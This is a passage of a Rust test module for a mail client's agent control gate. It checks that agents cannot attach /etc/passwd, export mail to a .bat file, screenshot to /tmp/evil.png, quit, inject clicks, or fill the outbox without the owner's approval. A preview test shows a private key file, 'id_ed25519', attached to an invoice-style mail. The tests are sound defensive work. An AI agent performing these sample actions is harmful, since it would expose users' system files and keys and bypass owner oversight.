        assert!(p.message.body.text.contains("Pay the invoice today."), "{}", p.message.body.text);
        // The file is named with its size, and its bytes don't go with the preview.
        assert_eq!(p.files.len(), 1);
        assert_eq!((p.files[0].name.as_str(), p.files[0].size), ("id_ed25519", 3));
        assert!(p.message.attachments.is_empty());
        assert!(p.files_line().starts_with("id_ed25519 ("));
        // A headless host's window reads it back as it was.
        let back: crate::SendPreview = serde_json::from_value(serde_json::to_value(p).unwrap()).unwrap();
        assert_eq!(
            (&back.message.subject, &back.message.bcc, &back.message.body, &back.files),
            (&p.message.subject, &p.message.bcc, &p.message.body, &p.files)
        );
        // The window shows it under the question, and a question about anything else has none.
        let ctx = egui::Context::default();
        let mut out = ctx.run_ui(egui::RawInput::default(), |ui| show(&mut a, ui.ctx()));
        out.textures_delta.clear();
        answer(&mut a, false);
        let (_, _rx) = ask(&mut a, "engine.execute", json!({"command": "mail.delete", "params": {}}), vec![]);
        assert!(a.asking.front().is_none_or(|q| q.preview.is_none()));
    }

    #[test]
    fn the_owners_own_scripts_work_as_before() {
        let mut a = app();
        write(&mut a);
        let (req, _) = ControlRequest::new("engine.execute", json!({"command": "compose.send"}));
        let out = crate::control::handle(&mut a, &egui::Context::default(), &req);
        assert!(matches!(out, Outcome::Done(ref v) if v["ok"] == true));
        assert_eq!(sent(&a), 1);
    }

    #[test]
    fn what_agents_never_get_through_the_window() {
        let mut a = app();
        write(&mut a);
        let all = Class::ALL.to_vec();
        let bat = std::env::temp_dir().join(format!("mailcraft-gate-{}.bat", std::process::id()));
        for (method, params) in [
            ("engine.execute", json!({"command": "compose.attach", "params": {"path": "/etc/passwd"}})),
            ("compose.attach", json!({"path": "/etc/passwd"})),
            ("engine.execute", json!({"command": "file.exportMessage", "params": {"id": 1, "path": bat.to_string_lossy()}})),
            ("engine.execute", json!({"command": "sync.apply", "params": {}})),
            ("engine.execute", json!({"command": "ui.copyLinkAddress", "params": {"url": "https://x.example"}})),
            ("engine.execute", json!({"command": "ui.copySelection", "params": {"pane": true}})),
            ("engine.execute", json!({"command": "ui.previewAttachment", "params": {"id": 13, "index": 0}})),
            ("engine.execute", json!({"command": "no.such"})),
            ("ui.screenshot", json!({"path": "/tmp/evil.png"})),
            ("app.quit", json!({})),
        ] {
            let (r, _) = ask(&mut a, method, params.clone(), all.clone());
            assert_eq!(r.unwrap_or_default()["ok"], false, "{method} {params}");
        }
        assert_eq!(a.session.compose.as_ref().unwrap().attachments.len(), 1);
        assert!(!a.quit_requested);
        assert!(!bat.exists());
        // Input only with `--allow input`.
        let (r, _) = ask(&mut a, "ui.click", json!({"x": 1, "y": 1}), vec![]);
        assert!(r.unwrap()["error"].as_str().unwrap().contains("--allow input"));
        assert!(a.synthetic.is_empty());
        let (r, _) = ask(&mut a, "ui.click", json!({"x": 1, "y": 1}), vec![Class::Input]);
        assert_eq!(r.unwrap()["ok"], true);
        // And none while the owner is asked.
        a.synthetic.clear();
        let _ = ask(&mut a, "compose.send", json!({}), vec![Class::Input]);
        let (r, _) = ask(&mut a, "ui.click", json!({"x": 1, "y": 1}), vec![Class::Input]);
        assert_eq!(r.unwrap()["ok"], false);
        assert!(a.synthetic.is_empty());
    }

    #[test]
    fn agents_cant_slip_mail_into_the_outbox() {
        let mut a = app();
        let outbox = a.session.mailbox.folders.iter().find(|f| f.kind == FolderKind::Outbox).unwrap().id;
        let id = *a.session.mailbox.messages.keys().next().unwrap();
        let (r, _) = ask(&mut a, "mail.copy", json!({"folder": outbox, "ids": [id]}), vec![]);
        assert!(r.is_none(), "asked first");
        answer(&mut a, false);
        assert_eq!(a.session.mailbox.count(outbox), 0);
    }
}
